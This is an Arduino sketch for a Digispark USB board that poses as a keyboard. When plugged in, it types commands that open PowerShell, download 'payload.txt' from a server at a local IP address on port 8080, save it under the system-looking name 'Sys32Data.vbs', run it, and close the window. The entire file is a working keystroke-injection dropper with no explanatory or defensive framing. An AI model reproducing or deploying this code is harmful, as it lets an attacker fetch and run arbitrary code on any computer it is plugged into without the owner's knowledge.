#include "DigiKeyboard.h"
#define DELAY 1000
 
void setup() {
}
 
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.print("$client.DownloadFile('http://192.168.134.133:8080/payload.txt', 'Sys32Data.vbs')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("start Sys32Data.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
  for (;;) {}
}
